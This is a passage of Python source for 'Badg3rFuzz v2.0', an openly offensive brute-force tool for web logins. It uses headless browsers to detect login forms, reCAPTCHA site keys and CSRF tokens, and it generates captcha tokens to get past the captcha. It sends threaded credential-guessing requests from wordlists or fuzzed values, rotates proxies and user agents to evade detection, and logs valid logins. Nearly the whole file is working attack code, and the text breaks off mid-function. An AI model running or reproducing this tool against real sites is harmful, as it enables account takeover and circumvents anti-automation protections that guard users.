import argparse
import threading
from queue import Queue
import requests
import time
from datetime import datetime
import random
import string
import os
import sys
import queue
import signal
import subprocess
import tempfile
import asyncio
import json
import re
from urllib.parse import urljoin, urlparse
from playwright.async_api import async_playwright, Browser, BrowserContext, Page
import nest_asyncio

# Allow nested event loops for threading compatibility
nest_asyncio.apply()

# Variables globales para colores
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'
GRAY = '\033[90m'

# Variables para manejo de contextos activos (migrado de drivers)
active_contexts = []
contexts_lock = threading.Lock()

# Variables para barra de progreso
total_attempts = 0
attempts_done = 0
attempts_lock = threading.Lock()
start_time_prog = None
stop_event = threading.Event()

# Globales y flags
combo_queue = queue.Queue()
success_flag = threading.Event()
print_lock = threading.Lock()

# Banner y funciones de impresión
def print_banner():
    now = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
    
    banner = f"""

        {RED}{BOLD}██████╗  █████╗ ██████╗  ██████╗ ██████╗ ██████╗{RESET}        
       {RED}{BOLD}██╔══██╗██╔══██╗██╔══██╗██╔════╝ ╚════██╗██╔══██╗{RESET}       
       {RED}{BOLD}██████╔╝███████║██║  ██║██║  ███╗ █████╔╝██████╔╝{RESET}       
       {RED}{BOLD}██╔══██╗██╔══██║██║  ██║██║   ██║ ╚═══██╗██╔══██╗{RESET}       
       {RED}{BOLD}██████╔╝██║  ██║██████╔╝╚██████╔╝██████╔╝██║  ██║{RESET}       
       {RED}{BOLD}╚═════╝ ╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝{RESET}        
                                                                                                                                                        
       {GREEN}{BOLD}███████╗██╗   ██╗███████╗███████╗{RESET}         
       {GREEN}{BOLD}██╔════╝██║   ██║╚══███╔╝╚══███╔╝{RESET}        
       {GREEN}{BOLD}█████╗  ██║   ██║  ███╔╝   ███╔╝ {RESET}        
       {GREEN}{BOLD}██╔══╝  ██║   ██║ ███╔╝   ███╔╝  {RESET}        
       {GREEN}{BOLD}██║     ╚██████╔╝███████╗███████╗{RESET}        
       {GREEN}{BOLD}╚═╝      ╚═════╝ ╚══════╝╚══════╝{RESET}        
                                                                             
 {MAGENTA}══════════════════════════════════════════════════════════════════════════{RESET}  
                             {WHITE}{BOLD}🦡 Badg3rFuzz v2.0{RESET}
                             {BLUE}Start: {now}{RESET}
        {CYAN}[NEW]{RESET} {WHITE}Playwright Engine + Auto-Detection + CSRF Intercept{RESET}
                                                                             
   {GREEN}[>]{RESET} {WHITE}Initializing Badg3rFuzz modules...{RESET}                                                            
                                                                             
"""
    print(banner)

def print_footer(start_time):
    end_time = datetime.now()
    dur = end_time - start_time
    print(f"{GREEN}[ ✔ ] Finished Attacks. Total: {attempts_done}{RESET}")
    print(f"\n⌛ Finished: {end_time.strftime('%d-%m-%Y %H:%M:%S')} (duration {dur})\n")

# Handler para señales
def signal_handler(signum, frame):
    print(f"\n{YELLOW}[!] Received signal ({signum}), starting clean finish...{RESET}")
    stop_event.set()
    # Limpiar la cola inmediatamente para evitar bloqueos
    try:
        while True:
            combo_queue.get_nowait()
            combo_queue.task_done()
    except queue.Empty:
        pass

def safe_print_lock(*args, **kwargs):
    print_lock.acquire()
    try:
        # Borrar línea anterior si se desea
        if kwargs.pop("_clear_line", False):
            print("\r" + " " * 120 + "\r", end='')
        print(*args, **kwargs)
    finally:
        print_lock.release()

def convert_der_to_pem_if_needed(cert_path):
    if not cert_path or not os.path.exists(cert_path):
        return cert_path
    
    try:
        with open(cert_path, 'rb') as f:
            cert_data = f.read()
        if b'-----BEGIN CERTIFICATE-----' in cert_data:
            return cert_path

        temp_fd, temp_pem_path = tempfile.mkstemp(suffix='.pem', prefix='badg3r_cert_')
        os.close(temp_fd)

        try:
            cmd = [
                'openssl', 'x509',
                '-inform', 'DER',
                '-in', cert_path,
                '-out', temp_pem_path,
                '-outform', 'PEM'
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10, shell=False)
            if result.returncode == 0:
                print(f"{GREEN}[i] Converted DER to PEM successfully: {temp_pem_path}{RESET}")
                return temp_pem_path
            else:
                print(f"{RED}[!] OpenSSL conversion failed: {result.stderr.strip()}{RESET}")
                try:
                    os.remove(temp_pem_path)
                except FileNotFoundError:
                    pass
                return None

        except FileNotFoundError:
            print(f"{RED}[!] OpenSSL not found in system PATH{RESET}")
            print(f"{YELLOW}[!] Please install OpenSSL or convert certificate manually:{RESET}")
            print(f"{YELLOW}    openssl x509 -inform DER -in {cert_path} -out {cert_path}.pem{RESET}")
            try:
                os.remove(temp_pem_path)
            except Exception:
                pass
            return None

        except subprocess.TimeoutExpired:
            print(f"{RED}[!] OpenSSL conversion timeout{RESET}")
            try:
                os.remove(temp_pem_path)
            except Exception:
                pass
            return None

    except Exception as e:
        print(f"{RED}[!] Error reading certificate file: {e}{RESET}")
        return None

async def auto_detect_form_structure(login_url, browser_type="firefox", verbose=False):
    """Auto-detect form structure including site-key, endpoints, and form fields"""
    detected_info = {
        'site_key': None,
        'post_url': None,
        'form_fields': [],
        'captcha_action': None,
        'csrf_tokens': {}
    }
    
    if stop_event.is_set() or success_flag.is_set():
        raise Exception("Operation cancelled")
    
    playwright = await async_playwright().start()
    
    try:
        # Launch browser
        if browser_type.lower() == "chrome":
            browser = await playwright.chromium.launch(headless=True)
        else:
            browser = await playwright.firefox.launch(headless=True)
        
        context = await browser.new_context()
        
        # Register context for cleanup
        with contexts_lock:
            active_contexts.append(context)
        
        page = await context.new_page()
        
        # Navigate to login page
        await page.goto(login_url)
        await page.wait_for_load_state('networkidle')
        
        # Auto-detect reCAPTCHA site key
        try:
            # 1. Buscar elementos con data-sitekey
            recaptcha_elements = await page.query_selector_all('[data-sitekey]')
            for element in recaptcha_elements:
                site_key = await element.get_attribute('data-sitekey')
                if site_key:
                    detected_info['site_key'] = site_key
                    if verbose:
                        safe_print_lock(f"[AUTO] Detected reCAPTCHA site-key (data-sitekey): {site_key}")
                    break

            # 2. Buscar en script[src] con ?render=
            if not detected_info['site_key']:
                script_tags = await page.query_selector_all('script[src]')
                for tag in script_tags:
                    src = await tag.get_attribute('src')
                    if src:
                        match = re.search(r'recaptcha/api\.js\?render=([0-9a-zA-Z_-]{30,})', src)
                        if match:
                            site_key = match.group(1)
                            detected_info['site_key'] = site_key
                            if verbose:
                                safe_print_lock(f"[AUTO] Detected reCAPTCHA site-key (script src): {site_key}")
                            break

            # 3. Buscar sitekey en contenido de scripts inline
            if not detected_info['site_key']:
                inline_scripts = await page.query_selector_all('script:not([src])')
                for script in inline_scripts:
                    content = await script.inner_text()
                    for pattern in [
                        r'grecaptcha\.execute\(["\']([0-9a-zA-Z_-]{30,})["\']',
                        r'var\s+siteKey\s*=\s*["\']([0-9a-zA-Z_-]{30,})["\']',
                        r'sitekey\s*[:=]\s*["\']([0-9a-zA-Z_-]{30,})["\']',
                    ]:
                        matches = re.findall(pattern, content)
                        if matches:
                            detected_info['site_key'] = matches[0]
                            if verbose:
                                safe_print_lock(f"[AUTO] Detected reCAPTCHA site-key (script inline): {matches[0]}")
                            break
                    if detected_info['site_key']:
                        break
        except:
            pass

        
        # Detect forms and their fields
        forms = await page.query_selector_all('form')
        for form in forms:
            form_action = await form.get_attribute('action')
            if form_action:
                # Resolve relative URLs
                detected_info['post_url'] = urljoin(login_url, form_action)
                if verbose:
                    safe_print_lock(f"[AUTO] Detected form action: {detected_info['post_url']}")
            
            # Detect form fields
            inputs = await form.query_selector_all('input')
            for inp in inputs:
                input_type = await inp.get_attribute('type')
                input_name = await inp.get_attribute('name')
                input_id = await inp.get_attribute('id')
                input_value = await inp.get_attribute('value')
                
                if input_name:
                    field_info = {
                        'name': input_name,
                        'type': input_type,
                        'id': input_id,
                        'value': input_value
                    }
                    detected_info['form_fields'].append(field_info)
                    
                    # Detect potential CSRF tokens
                    if input_type == 'hidden' and input_value:
                        detected_info['csrf_tokens'][input_name] = input_value
        
        # Try to detect reCAPTCHA action from script tags
        scripts = await page.query_selector_all('script')
        for script in scripts:
            script_content = await script.inner_text()
            if 'grecaptcha.execute' in script_content:
                # Extract action from grecaptcha.execute calls
                action_match = re.search(r'grecaptcha\.execute\([^,]+,\s*\{\s*action:\s*[\'"]([^\'"]+)[\'"]', script_content)
                if action_match:
                    detected_info['captcha_action'] = action_match.group(1)
                    if verbose:
                        safe_print_lock(f"[AUTO] Detected reCAPTCHA action: {detected_info['captcha_action']}")
        
        return detected_info
        
    finally:
        try:
            with contexts_lock:
                if context in active_contexts:
                    active_contexts.remove(context)
            await context.close()
            await browser.close()
        except:
            pass
        finally:
            await playwright.stop()

async def intercept_csrf_request(login_url, post_url, browser_type="firefox", verbose=False):
    """Intercept actual login request to extract real structure"""
    intercepted_data = {
        'headers': {},
        'form_data': {},
        'method': 'POST',
        'url': post_url
    }
    
    if stop_event.is_set() or success_flag.is_set():
        raise Exception("Operation cancelled")
    
    playwright = await async_playwright().start()
    
    try:
        if browser_type.lower() == "chrome":
            browser = await playwright.chromium.launch(headless=True)
        else:
            browser = await playwright.firefox.launch(headless=True)
        
        context = await browser.new_context()
        
        with contexts_lock:
            active_contexts.append(context)
        
        page = await context.new_page()
        
        # Set up request interception
        requests_captured = []
        
        async def handle_request(request):
            if request.request.method == 'POST' and post_url in request.request.url:
                requests_captured.append({
                    'url': request.url,
                    'method': request.method,
                    'headers': request.headers,
                    'post_data': request.post_data
                })
            await request.continue_()
        
        await page.route('**/*', handle_request)
        await page.goto(login_url)
        await page.wait_for_load_state('networkidle')
        
        # Try to fill and submit form with dummy data
        try:
            # Fill common username fields
            username_selectors = ['input[name*="user" i]', 'input[name*="email" i]', 'input[name*="login" i]', '#username', '#user', '#email']
            for selector in username_selectors:
                try:
                    await page.fill(selector, 'dummy_user', timeout=1000)
                    break
                except:
                    continue
            
            # Fill common password fields
            password_selectors = ['input[type="password"]', 'input[name*="pass" i]', '#password', '#pass']
            for selector in password_selectors:
                try:
                    await page.fill(selector, 'dummy_pass', timeout=1000)
                    break
                except:
                    continue
            
            # Submit form
            submit_selectors = ['input[type="submit"]', 'button[type="submit"]', 'button:has-text("login" i)', 'button:has-text("submit" i)']
            for selector in submit_selectors:
                try:
                    await page.click(selector, timeout=1000)
                    await page.wait_for_timeout(2000)  # Wait for request
                    break
                except:
                    continue
        except:
            pass
        
        # Process intercepted requests
        if requests_captured:
            request = requests_captured[0]  # Take first captured request
            intercepted_data['headers'] = request['headers']
            intercepted_data['url'] = request['url']
            
            # Parse form data
            if request['post_data']:
                try:
                    # Try to parse as form data
                    if 'application/x-www-form-urlencoded' in request['headers'].get('content-type', ''):
                        import urllib.parse
                        parsed_data = urllib.parse.parse_qs(request['post_data'])
                        intercepted_data['form_data'] = {k: v[0] if v else '' for k, v in parsed_data.items()}
                    else:
                        # Try as JSON
                        intercepted_data['form_data'] = json.loads(request['post_data'])
                except:
                    # Raw post data
                    intercepted_data['raw_data'] = request['post_data']
            
            if verbose:
                safe_print_lock(f"[CSRF] Intercepted request to: {request['url']}")
                safe_print_lock(f"[CSRF] Form fields detected: {list(intercepted_data['form_data'].keys())}")
        
        return intercepted_data
        
    finally:
        try:
            with contexts_lock:
                if context in active_contexts:
                    active_contexts.remove(context)
            await context.close()
            await browser.close()
        except:
            pass
        finally:
            await playwright.stop()

def validate_and_prompt_detection(auto_detected, manual_args, auto_yes=False):
    """Compare auto-detected vs manual config and prompt user"""
    discrepancies = []
    
    # Check site-key
    if manual_args.site_key and auto_detected.get('site_key'):
        if manual_args.site_key != auto_detected['site_key']:
            discrepancies.append(f"Site-key: Manual({manual_args.site_key}) vs Auto({auto_detected['site_key']})")
    
    # Check post URL
    if manual_args.post_url and auto_detected.get('post_url'):
        if manual_args.post_url != auto_detected['post_url']:
            discrepancies.append(f"POST URL: Manual({manual_args.post_url}) vs Auto({auto_detected['post_url']})")
    
    # Check captcha action
    if manual_args.captcha_action and auto_detected.get('captcha_action'):
        if manual_args.captcha_action != auto_detected['captcha_action']:
            discrepancies.append(f"Captcha Action: Manual({manual_args.captcha_action}) vs Auto({auto_detected['captcha_action']})")
    
    if discrepancies and not auto_yes:
        print(f"\n{YELLOW}[!] Configuration discrepancies detected:{RESET}")
        for disc in discrepancies:
            print(f"    {disc}")
        
        choice = input(f"\n{CYAN}Use auto-detected values? [Y/n]: {RESET}").lower()
        if choice == 'n' or choice == 'no':
            return 'manual'
        else:
            return 'auto'
    
    return 'auto' if auto_yes else 'auto'

def apply_custom_structure(template, username, password, email=None, tokens=None):
    """Apply flexible regex patterns to custom structure"""
    result = template
    
    # Basic substitutions
    result = result.replace('^USER^', username)
    result = result.replace('^PASS^', password)
    
    if email:
        result = result.replace('^EMAIL^', email)
    
    # Handle captcha token
    result = result.replace('^CAPTCHA^', tokens.get('captcha', '') if tokens else '')
    
    # Handle numbered tokens ^TOKEN1^, ^TOKEN2^, etc.
    if tokens:
        for i, (key, value) in enumerate(tokens.items(), 1):
            result = result.replace(f'^TOKEN{i}^', value)
    
    return result

async def generar_token_y_cookie(site_key, captcha_action, login_url, browser_type="firefox", verbose=False):
    """Migrated from Selenium to Playwright - Generate reCAPTCHA token and cookies"""
    if stop_event.is_set() or success_flag.is_set():
        raise Exception("Operation cancelled by user")
    
    if verbose:
        safe_print_lock(f"[i] Init Playwright Browser: {browser_type}")

    playwright = await async_playwright().start()
    
    try:
        # Launch browser based on type
        if browser_type.lower() == "chrome":
            browser = await playwright.chromium.launch(headless=True)
        else:  # firefox por defecto
            browser = await playwright.firefox.launch(headless=True)
        
        context = await browser.new_context()
        
        # Register context for cleanup
        with contexts_lock:
            active_contexts.append(context)
        
        page = await context.new_page()
        await page.goto(login_url)
        
        # Wait for reCAPTCHA to load
        try:
            await page.wait_for_selector('.g-recaptcha', timeout=5000)
        except:
            if verbose:
                safe_print_lock("[!] Captcha Timeout", _clear_line=True)
            pass

        # Execute reCAPTCHA token generation
        token = await page.evaluate(f"""
            new Promise(resolve => {{
                if (typeof grecaptcha !== 'undefined') {{
                    grecaptcha.ready(function() {{
                        grecaptcha.execute("{site_key}", {{action: "{captcha_action}"}}).then(function(token) {{
                            resolve(token);
                        }});
                    }});
                }} else {{
                    resolve(null);
                }}
            }});
        """)

        # Get cookies
        cookies_list = await context.cookies()
        cookies = {cookie["name"]: cookie["value"] for cookie in cookies_list}
        
        return token, cookies
        
    finally:
        try:
            with contexts_lock:
                if context in active_contexts:
                    active_contexts.remove(context)
            await context.close()
            await browser.close()
        except:
            pass
        finally:
            await playwright.stop()

def cargar_diccionario(filepath):
    if not filepath or not os.path.exists(filepath):
        return []
    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

def cargar_user_agents(filepath):
    if not filepath or not os.path.exists(filepath):
        # User agents por defecto
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
        ]
    
    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

def cargar_proxies(proxy_file=None, single_proxy=None):
    """Multi Proxy loaded from file or single one by args"""
    proxies = []
    
    if single_proxy:
        proxies.append(single_proxy.strip())
    
    if proxy_file and os.path.exists(proxy_file):
        with open(proxy_file, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):  # Ignorar comentarios
                    proxies.append(line)
    
    # Validar formato básico de proxies
    valid_proxies = []
    for proxy in proxies:
        if '://' in proxy:  # Formato básico http://... o socks://...
            valid_proxies.append(proxy)
        else:
            safe_print_lock(f"{YELLOW}[!] Ignoring Proxy with invalid format: {proxy}{RESET}")
    
    return valid_proxies

def get_combined_patterns(custom_patterns, pattern_type="success"):
    """Combine custom and common patterns"""
    
    base_success_patterns = [
        "true", "success", "bienvenido", "dashboard", "welcome", "loggedin",
        "successful", "correcto", "válido", "exitoso", "login successful"
    ]
    
    base_fail_patterns = [
        "false", "error", "failed", "usuario", "contraseña", "erroneos", "erróneos", 
        "incorrecto", "inválido", "Usuario o contraseña erróneos",
        "Acceso denegado por captcha", "credenciales incorrectas", 
        "datos incorrectos", "login failed", "authentication failed"
    ]
    
    if pattern_type == "success":
        return base_success_patterns + (custom_patterns if custom_patterns else [])
    else:
        return base_fail_patterns + (custom_patterns if custom_patterns else [])

def generar_fuzzers(tipo="digits", min_len=5, max_len=10, cantidad=100):
    chars = ''
    if tipo == "digits":
        chars = string.digits
    elif tipo == "digits+":
        chars = "123456789"
    elif tipo == "letters":
        chars = string.ascii_letters
    elif tipo == "mix":
        chars = string.ascii_letters + string.digits
    elif tipo == "strong":
        chars = string.ascii_letters + string.digits + string.punctuation
    else:
        chars = string.digits

    fuzz = set()
    while len(fuzz) < cantidad:
        length = random.randint(min_len, max_len)
        fuzz.add(''.join(random.choices(chars, k=length)))
    return list(fuzz)

def check_success(response, success_indicators, fail_indicators, success_codes, check_cookies=True, verbose=False):
    """
    Smart multi-layer analysis for detect successful login
    Prioritize content analyze above HTTP Code response
    """
    response_text = response.text.lower()
    
    # Capa 1: Análisis de contenido - Patrones de FALLO (alta prioridad)
    for fail_pattern in fail_indicators:
        if fail_pattern.lower() in response_text:
            if verbose:
                safe_print_lock(f"[DEBUG] Fail pattern found: {fail_pattern}", _clear_line=True)
            return False, f"Fail pattern detected: {fail_pattern}"
    
    # Capa 2: Análisis de contenido - Patrones de ÉXITO (alta prioridad)
    for success_pattern in success_indicators:
        if success_pattern.lower() in response_text:
            if verbose:
                safe_print_lock(f"[DEBUG] Success pattern found: {success_pattern}", _clear_line=True)
            return True, f"Success pattern detected: {success_pattern}"
    
    # Capa 3: Verificar redirecciones exitosas
    if hasattr(response, 'history') and response.history:
        redirect_url = response.url.lower()
        success_redirect_patterns = ["dashboard", "home", "panel", "admin", "profile", "welcome"]
        
        for pattern in success_redirect_patterns:
            if pattern in redirect_url:
                if verbose:
                    safe_print_lock(f"[DEBUG] Success redirect detected: {redirect_url}", _clear_line=True)
                return True, f"Success redirect to: {pattern}"
    
    # Capa 4: Verificar cookies de sesión
    if check_cookies and response.cookies:
        session_cookie_patterns = ["session", "auth", "login", "token", "jsessionid", "phpsessid"]
        
        for cookie_name in response.cookies.keys():
            cookie_name_lower = cookie_name.lower()
            for pattern in session_cookie_patterns:
                if pattern in cookie_name_lower:
                    if verbose:
                        safe_print_lock(f"[DEBUG] Session cookie detected: {cookie_name}", _clear_line=True)
                    return True, f"Session cookie set: {cookie_name}"
    
    # Capa 5: Análisis JSON (compatibilidad con código existente)
    try:
        data = response.json()
        if not data.get("Result", True):
            msg = data.get("Msg", "Unknown JSON error")
            return False, f"JSON Result=False: {msg}"
        elif data.get("Result", False):  # Explícitamente True
            return True, "JSON Result=True"
    except ValueError:
        # No es JSON, continuar
        pass
    
    # Capa 6: Códigos HTTP como indicador COMPLEMENTARIO (baja prioridad)
    if response.status_code in success_codes and response.status_code != 200:
        if verbose:
            safe_print_lock(f"[DEBUG] Success HTTP code detected: {response.status_code}", _clear_line=True)
        return True, f"Success HTTP code: {response.status_code}"
    
    # Si llegamos aquí, asumimos fallo por defecto
    return False, f"No success indicators found (HTTP: {response.status_code})"

def login_attempt(username, password, site_key, captcha_action, login_url, post_url, origin_url=None, 
                  browser_type="firefox", verbose=False, user_agent=None, proxy=None, proxy_timeout=20,
                  disable_ssl_verify=False, ca_cert_path=None, custom_structure=None, email=None):
    """Migrated login attempt using Playwright for token generation"""
    # Verificar si debemos parar antes de crear Browser
    if stop_event.is_set() or success_flag.is_set():
        raise Exception("Operation cancelled")
    
    # Create new event loop for this thread
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        # Generate token using Playwright
        token, cookies = loop.run_until_complete(
            generar_token_y_cookie(site_key, captcha_action, login_url, browser_type, verbose)
        )
        
        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": user_agent if user_agent else "Mozilla/5.0",        
            "Origin": origin_url if origin_url else login_url.split("/")[0],
            "Referer": login_url,
            "Accept": "*/*"
        }

        # Prepare data based on custom structure or default
        if custom_structure:
            # Use custom structure with pattern replacement
            tokens = {'captcha': token} if token else {}
            data_str = apply_custom_structure(custom_structure, username, password, email, tokens)
            
            # Try to parse as JSON first, then as form data
            try:
                data = json.loads(data_str)
                headers["Content-Type"] = "application/json"
            except:
                # Parse as form data
                import urllib.parse
                data = dict(urllib.parse.parse_qsl(data_str))
        else:
            # Default structure
            data = {
                "User": username,
                "Pass": password,
                "tokenCaptcha": token
            }

        with requests.Session() as s:
            s.cookies.update(cookies)
            
            # Configurar SSL
            if disable_ssl_verify:
                s.verify = False
                # Suprimir warnings de SSL
                import urllib3
                urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            elif ca_cert_path and os.path.exists(ca_cert_path):
                pem_cert_path = convert_der_to_pem_if_needed(ca_cert_path)
                if pem_cert_path and os.path.exists(pem_cert_path):
                    s.verify = pem_cert_path
                    if verbose:
                        safe_print_lock(f"[i] Using CA cert: {pem_cert_path}")
                else:
                    safe_print_lock(f"{RED}[!] Could not process certificate file: {ca_cert_path}{RESET}")
                    safe_print_lock(f"{YELLOW}[!] Falling back to default SSL verification{RESET}")
            
            # Configurar proxy si se proporciona
            if proxy:
                proxies_dict = {
                    'http': proxy,
                    'https': proxy
                }
                s.proxies.update(proxies_dict)
            
            # Configurar timeout
            if verbose:
                req = requests.Request("POST", post_url, headers=headers, data=data)
                prepared = s.prepare_request(req)
                print("\n=== REQUEST DEBUG ===")
                print(f"URL: {prepared.url}")
                print(f"Method: {prepared.method}")
                print("Headers:")
                for k, v in prepared.headers.items():
                    print(f"  {k}: {v}")
                print("\nBody:")
                print(prepared.body.decode() if isinstance(prepared.body, bytes) else prepared.body)
                print("=====================\n")
            
            # Send request based on data type
            if isinstance(data, dict) and headers.get("Content-Type") == "application/json":
                response = s.post(post_url, headers=headers, json=data, timeout=proxy_timeout)
            else:
                response = s.post(post_url, headers=headers, data=data, timeout=proxy_timeout)
            
            return response
            
    finally:
        loop.close()

def worker(site_key, captcha_action, login_url, post_url, origin_url, stop_on_success, log_filename, 
          browser_type, verbose, success_indicators, fail_indicators, success_codes, check_cookies, 
          delay, jitter, user_agents_file, proxies_list, proxy_timeout, disable_ssl_verify, ca_cert_path,
          attack_mode, custom_structure, email_list):
    global attempts_done
    thread_id = threading.current_thread().ident
    user_agents = cargar_user_agents(user_agents_file)
    ua_index = 0
    
    # Inicializar índices para rotación
    proxy_index = 0
    current_proxy = None
    if proxies_list:
        current_proxy = proxies_list[proxy_index % len(proxies_list)]
    
    # Email rotation for combo attacks
    email_index = 0
    current_email = None
    if email_list:
        current_email = email_list[email_index % len(email_list)]
    
    while not success_flag.is_set() and not stop_event.is_set():
        try:
            # Timeout más corto para que el thread sea más responsivo a las señales
            combo_data = combo_queue.get(timeout=0.5)
            
            # Handle different attack modes
            if attack_mode == "sniper":
                username, password = combo_data
            elif attack_mode == "gutling":
                username, password = combo_data
            else:  # auto-detect or default
                username, password = combo_data
                
        except queue.Empty:
            break
        
        # Seleccionar user agent rotativo
        current_ua = user_agents[ua_index % len(user_agents)]
        ua_index += 1
        
        # Verificar nuevamente si debemos parar antes de procesar
        if stop_event.is_set() or success_flag.is_set():
            combo_queue.task_done()
            break
            
        try:
            # Verificar eventos antes de intentar login
            response = login_attempt(
                username, password, site_key, captcha_action, login_url, post_url, origin_url, 
                browser_type, verbose, current_ua, current_proxy, proxy_timeout,
                disable_ssl_verify, ca_cert_path, custom_structure, current_email
            )
            
            # Rotar proxy si hay múltiples
            if proxies_list and len(proxies_list) > 1:
                proxy_index += 1
                current_proxy = proxies_list[proxy_index % len(proxies_list)]
            
            # Rotar email si hay múltiples
            if email_list and len(email_list) > 1:
                email_index += 1
                current_email = email_list[email_index % len(email_list)]
            
            # Rate limiting
            if delay > 0:
                sleep_time = delay
                if jitter > 0:
                    sleep_time += random.uniform(0, jitter)
                time.sleep(sleep_time) 
            
            if verbose:
                safe_print_lock(f"[+] Login:password attempt : {username}:{password}", _clear_line=True)
                try:
                    response_json = response.json()
                    safe_print_lock(f"[+] Server Response : HTTP {response.status_code} > {response_json}", _clear_line=True)
                except:
                    safe_print_lock(f"[+] Server Response : HTTP {response.status_code} > {response.text[:100]}...", _clear_line=True)
            else:
                safe_print_lock(f"[+] Attempt: {username}:{password}", _clear_line=True)

            success, error_msg = check_success(
                response, 
                success_indicators, 
                fail_indicators,
                success_codes,
                check_cookies,
                verbose
            )
            
            if success:
                print(f"{GREEN}[+] Valid Login Found! {username}:{password}{RESET}")
                with open(log_filename, "a", encoding="utf-8") as f:
                    f.write(f"SUCCESS: {username}:{password}\n")
                success_flag.set()
                if stop_on_success:
                    # Limpiar la cola
                    while not combo_queue.empty():
                        try:
                            combo_queue.get_nowait()
                            combo_queue.task_done()
                        except queue.Empty:
                            break
            else:
                with open(log_filename, "a", encoding="utf-8") as f:
                    f.write(f"[-] FAIL: {username}:{password} - {error_msg}\n")
                        
        except Exception as e:
            if not stop_event.is_set():
                if "proxy" in str(e).lower():
                    safe_print_lock(f"{RED}[!] Proxy Error with {username}:{password}: {e}{RESET}", _clear_line=True)
                else:
                    safe_print_lock(f"{RED}[!] Error with {username}:{password}: {e}{RESET}", _clear_line=True)
        finally:
            # Actualizar contador y marcar tarea como completada
            with attempts_lock:
                attempts_done += 1
            try:
                combo_queue.task_done()
            except ValueError:
                # Ya fue marcada como completada
                pass            

def parse_user_fuzzer(fuzzer_str):
    # formato tipo:min_len:max_len:cantidad
    # ejemplo digits:6:6:100
    try:
        tipo, min_len, max_len, count = fuzzer_str.split(":")
        return tipo, int(min_len), int(max_len), int(count)
    except Exception as e:
        raise ValueError(f"Invalid format for --user-fuzz: {fuzzer_str}. Must be type:min_len:max_len:count")

def mostrar_barra_progreso():
    global start_time_prog
    if start_time_prog is None:
        start_time_prog = time.time()

    while not success_flag.is_set() and (attempts_done < total_attempts) and not stop_event.is_set():
        with attempts_lock:
            percent = (attempts_done / total_attempts) * 100 if total_attempts > 0 else 0
            elapsed = time.time() - start_time_prog
            speed = attempts_done / elapsed if elapsed > 0 else 0
            remaining = total_attempts - attempts_done
            eta = remaining / speed if speed > 0 else 0

        bar_length = 30
        filled_length = int(bar_length * attempts_done // total_attempts) if total_attempts else 0
        bar = '=' * filled_length + '-' * (bar_length - filled_length)

        safe_print_lock(f"\r{CYAN}[{bar}] {attempts_done}/{total_attempts} ({percent:.2f}%) | ETA: {eta:.1f}s{RESET}", end='', flush=True)

        time.sleep(0.2)

    # Imprime línea final al terminar
    safe_print_lock()

def preparar_combos(username_file, password_file, user_fuzzer, attack_mode="auto", email_file=None):
    """Prepare combinations based on attack mode"""
    
    # Load usernames
    if username_file and os.path.exists(username_file):
        usernames = cargar_diccionario(username_file)
    else:
        # genera fuzz para usuarios
        if user_fuzzer:
            tipo, min_len, max_len, cantidad = parse_user_fuzzer(user_fuzzer)
            usernames = generar_fuzzers(tipo, min_len, max_len, cantidad)
        else:
            usernames = generar_fuzzers("digits", 5, 12, 20)

    # Load passwords
    if password_file and os.path.exists(password_file):
        passwords = cargar_diccionario(password_file)
    else:
        passwords = generar_fuzzers("strong", 8, 16, 20)
    
    # Load emails if provided
    emails = []
    if email_file and os.path.exists(email_file):
        emails = cargar_diccionario(email_file)

    # Generate combinations based on attack mode
    if attack_mode == "sniper":
        # Sniper mode: iterate through multiple wordlists systematically
        for u in usernames:
            for p in passwords:
                combo_queue.put((u, p))
    elif attack_mode == "gutling":
        # Gutling mode: use single wordlist for both username and password
        combined_list = usernames if len(usernames) >= len(passwords) else passwords
        for i, item in enumerate(combined_list):
            # Use same item for both username and password, or pair with index
            username = usernames[i % len(usernames)] if usernames else item
            password = passwords[i % len(passwords)] if passwords else item
            combo_queue.put((username, password))
    else:  # auto-detect or default
        # Default mode: full cartesian product
        for u in usernames:
            for p in passwords:
                combo_queue.put((u, p))
    
    return emails

def cleanup_and_exit(threads, start_time):
    """Function to clean up resources and exit gracefully"""
    print(f"\n{YELLOW}[!] Init gracefully exit...{RESET}")
    
    # Establecer eventos de parada
    stop_event.set()
    
    # Forzar cierre de todos los contextos activos
    force_close_contexts()
    
    print(f"{YELLOW}[!] Forcing threads termination...{RESET}")
    print_footer(start_time)

def wait_for_threads(threads, timeout=3):
    """Esperar threads con timeout agresivo"""
    for i, t in enumerate(threads):
        if t.is_alive():
            try:
                t.join(timeout=timeout)
                if t.is_alive():
                    print(f"{YELLOW}[!] Thread {i+1} timeout - forcing exit{RESET}")
            except:
                pass

def force_close_contexts():
    """Fuerza el cierre de todos los contextos activos"""
    
    with contexts_lock:
        contexts_to_close = active_contexts.copy()
        active_contexts.clear()
    
    for context in contexts_to_close:
        try:
            # Create new event loop to close context
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(context.close())
            loop.close()
        except:
            pass

def cleanup_temp_certs():
    """Limpiar certificados temporales creados durante la ejecución"""
    import glob
